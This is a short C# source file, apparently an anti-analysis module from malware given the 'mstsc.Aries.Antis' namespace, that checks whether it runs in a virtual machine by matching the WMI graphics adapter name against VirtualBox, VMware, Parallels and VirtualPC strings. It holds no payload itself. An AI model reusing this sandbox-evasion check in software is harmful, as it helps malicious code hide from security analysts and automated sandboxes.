

namespace mstsc.Aries.Antis
{
    sealed class Virtualized
    {
        string device = getGraphicDevice();
        public bool IsVirtual()
        {
            if (device == "VirtualBox Graphics Adapter" || device.Contains("VMware SVGA") ||
            device == "Parallels Video Adapter" || checkVirtPC())
            {//device == "VMware SVGA II"
                //new AntiFound();
                System.GC.Collect();
                return true;
            }
            //System.GC.Collect();
            return false;
        }


        /// <summary>
        /// Return the graphics card this computer is using
        /// </summary>
        private static string getGraphicDevice()
        {
            try
            {
                System.Management.ManagementObjectSearcher mSearcher = new System.Management.ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_VideoController");
                string sData = null;
                foreach (System.Management.ManagementObject tObj in mSearcher.Get())
                {
                    sData = System.Convert.ToString(tObj["Description"]);
                }
                return sData;
            }
            catch (System.Exception) { return "Error"; }
        }

        /// <summary>
        /// Check if VirtualPC is running
        /// </summary>
        private bool checkVirtPC()
        {
            try
            {
                string[] sArray = new string[] { "VM Additions S3 Trio32/64", "S3 Trio32/64" };
                for (int i = 0; i < sArray.Length; i++)
                {
                    if (device == sArray[i]) 
                        return true;
                }
            }
            catch { }
            return false;
        }
    }
}
